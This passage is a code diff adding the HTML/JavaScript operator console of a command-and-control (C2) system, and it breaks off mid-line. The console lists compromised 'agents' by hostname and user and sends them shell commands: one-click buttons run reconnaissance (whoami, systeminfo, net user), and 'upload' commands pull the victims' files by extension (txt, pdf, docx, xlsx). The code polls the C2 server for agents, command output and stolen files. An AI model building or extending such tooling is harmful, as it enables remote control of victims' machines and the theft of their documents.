@@ -1,0 +1,157 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>C2 Console</title>
+<style>
+* { box-sizing: border-box; margin: 0; padding: 0; }
+body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #0f1117; color: #c9d1d9; height: 100vh; display: flex; flex-direction: column; }
+header { background: #161b22; border-bottom: 1px solid #30363d; padding: 12px 24px; display: flex; align-items: center; justify-content: space-between; }
+header h1 { font-size: 18px; color: #58a6ff; }
+header .status { font-size: 12px; color: #8b949e; }
+main { display: flex; flex: 1; overflow: hidden; }
+aside { width: 320px; background: #161b22; border-right: 1px solid #30363d; display: flex; flex-direction: column; }
+.panel-title { padding: 12px 16px; font-size: 13px; font-weight: 600; color: #8b949e; text-transform: uppercase; letter-spacing: 0.5px; border-bottom: 1px solid #21262d; }
+.agent-list { flex: 1; overflow-y: auto; }
+.agent-item { padding: 12px 16px; border-bottom: 1px solid #21262d; cursor: pointer; transition: background 0.15s; }
+.agent-item:hover { background: #1f242c; }
+.agent-item.active { background: #1f6feb22; border-left: 3px solid #58a6ff; }
+.agent-item .guid { font-family: monospace; font-size: 12px; color: #58a6ff; margin-bottom: 4px; word-break: break-all; }
+.agent-item .meta { font-size: 12px; color: #8b949e; }
+.agent-item .meta span { margin-right: 10px; }
+.content { flex: 1; display: flex; flex-direction: column; overflow: hidden; }
+.tabs { display: flex; background: #161b22; border-bottom: 1px solid #30363d; }
+.tab { padding: 10px 20px; font-size: 13px; cursor: pointer; border-bottom: 2px solid transparent; color: #8b949e; }
+.tab.active { color: #c9d1d9; border-bottom-color: #58a6ff; }
+.tab-content { flex: 1; overflow-y: auto; padding: 16px; display: none; }
+.tab-content.active { display: block; }
+.terminal { background: #0d1117; border: 1px solid #30363d; border-radius: 6px; padding: 12px; font-family: 'Consolas', 'Monaco', monospace; font-size: 13px; min-height: 300px; max-height: 60vh; overflow-y: auto; white-space: pre-wrap; word-break: break-word; margin-bottom: 12px; }
+.command-line { display: flex; gap: 8px; }
+.command-line input { flex: 1; background: #0d1117; border: 1px solid #30363d; border-radius: 6px; padding: 10px 12px; color: #c9d1d9; font-family: monospace; font-size: 13px; }
+.command-line input:focus { outline: none; border-color: #58a6ff; }
+.btn { background: #238636; border: 1px solid rgba(46,160,67,0.4); border-radius: 6px; padding: 10px 16px; color: #fff; font-size: 13px; cursor: pointer; }
+.btn:hover { background: #2ea043; }
+.btn-secondary { background: #21262d; border-color: #30363d; }
+.btn-secondary:hover { background: #30363d; }
+.quick-btns { display: flex; gap: 8px; margin-bottom: 12px; flex-wrap: wrap; }
+.file-list { display: flex; flex-direction: column; gap: 8px; }
+.file-item { background: #161b22; border: 1px solid #30363d; border-radius: 6px; padding: 12px; display: flex; align-items: center; justify-content: space-between; }
+.file-item .info { flex: 1; }
+.file-item .name { font-family: monospace; font-size: 13px; color: #58a6ff; margin-bottom: 4px; }
+.file-item .meta { font-size: 12px; color: #8b949e; }
+.file-item .progress { width: 200px; height: 6px; background: #21262d; border-radius: 3px; overflow: hidden; margin: 0 12px; }
+.file-item .progress-bar { height: 100%; background: #238636; transition: width 0.3s; }
+.empty { color: #8b949e; font-size: 13px; padding: 20px; text-align: center; }
+.prompt { color: #7ee787; }
+.error { color: #f85149; }
+.info { color: #79c0ff; }
+</style>
+</head>
+<body>
+<header>
+<h1>C2 Console</h1>
+<div class="status" id="status">Polling...</div>
+</header>
+<main>
+<aside>
+<div class="panel-title">Agents</div>
+<div class="agent-list" id="agentList"><div class="empty">No agents yet</div></div>
+</aside>
+<div class="content">
+<div class="tabs">
+<div class="tab active" onclick="switchTab('shell')">Shell</div>
+<div class="tab" onclick="switchTab('files')">Downloads</div>
+</div>
+<div class="tab-content active" id="tab-shell">
+<div class="quick-btns">
+<button class="btn btn-secondary" onclick="sendQuick('whoami')">whoami</button>
+<button class="btn btn-secondary" onclick="sendQuick('dir')">dir</button>
+<button class="btn btn-secondary" onclick="sendQuick('ipconfig /all')">ipconfig</button>
+<button class="btn btn-secondary" onclick="sendQuick('systeminfo')">systeminfo</button>
+<button class="btn btn-secondary" onclick="sendQuick('tasklist')">tasklist</button>
+<button class="btn btn-secondary" onclick="sendQuick('net user')">net user</button>
+</div>
+<div class="terminal" id="terminal"></div>
+<div class="command-line">
+<input type="text" id="cmdInput" placeholder="Enter command... (e.g. upload C:\Users\Admin\Desktop\secret.txt)" onkeydown="if(event.key==='Enter')sendCommand()">
+<button class="btn" onclick="sendCommand()">Send</button>
+</div>
+<div style="margin-top:10px;font-size:12px;color:#8b949e;">
+Quick upload: <button class="btn btn-secondary" style="padding:4px 8px;font-size:12px;" onclick="sendQuick('upload_ext txt')">upload_ext txt</button>
+<button class="btn btn-secondary" style="padding:4px 8px;font-size:12px;" onclick="sendQuick('upload_ext pdf')">upload_ext pdf</button>
+<button class="btn btn-secondary" style="padding:4px 8px;font-size:12px;" onclick="sendQuick('upload_ext docx')">upload_ext docx</button>
+<button class="btn btn-secondary" style="padding:4px 8px;font-size:12px;" onclick="sendQuick('upload_ext xlsx')">upload_ext xlsx</button>
+</div>
+</div>
+<div class="tab-content" id="tab-files">
+<div class="file-list" id="fileList"><div class="empty">No files yet</div></div>
+</div>
+</div>
+</main>
+<script>
+let selectedGuid = null;
+let agents = {};
+let commands = {};
+let files = [];
+
+function switchTab(name) {
+    document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+    document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
+    event.target.classList.add('active');
+    document.getElementById('tab-' + name).classList.add('active');
+}
+
+async function fetchAgents() {
+    try {
+        const r = await fetch('/api/agents');
+        agents = await r.json();
+        renderAgents();
+        document.getElementById('status').textContent = 'Connected - ' + Object.keys(agents).length + ' agents';
+    } catch(e) {
+        document.getElementById('status').textContent = 'Connection error';
+    }
+}
+
+async function fetchOutput() {
+    if (!selectedGuid) return;
+    try {
+        const r = await fetch('/api/agents/' + encodeURIComponent(selectedGuid) + '/output');
+        commands[selectedGuid] = await r.json();
+        renderTerminal();
+    } catch(e) {}
+}
+
+async function fetchFiles() {
+    try {
+        const r = await fetch('/api/files');
+        files = await r.json();
+        renderFiles();
+    } catch(e) {}
+}
+
+function renderAgents() {
+    const list = document.getElementById('agentList');
+    const keys = Object.keys(agents);
+    if (keys.length === 0) { list.innerHTML = '<div class="empty">No agents yet</div>'; return; }
+    list.innerHTML = keys.map(guid => {
+        const a = agents[guid];
+        const active = guid === selectedGuid ? 'active' : '';
+        return '<div class="agent-item ' + active + '" onclick="selectAgent(\'' + guid + '\')">' +
+            '<div class="guid">' + guid + '</div>' +
+            '<div class="meta"><span>' + (a.hostname||'unknown') + '</span><span>' + (a.username||'unknown') + '</span><span>' + (a.last_seen ? new Date(a.last_seen).toLocaleTimeString() : 'never') + '</span></div>' +
+            '</div>';
+    }).join('');
+}
+
+function selectAgent(guid) {
+    selectedGuid = guid;
+    renderAgents();
+    renderTerminal();
+}
+
+function renderTerminal() {
+    const term = document.getElementById('terminal');
+    if (!selectedGuid) { term.textContent = 'Select an agent from the left panel.'; return; }
+    const cmds = commands[selectedGuid] || [];
+    if (cmds.length === 0) { term.innerHTML = '<span 
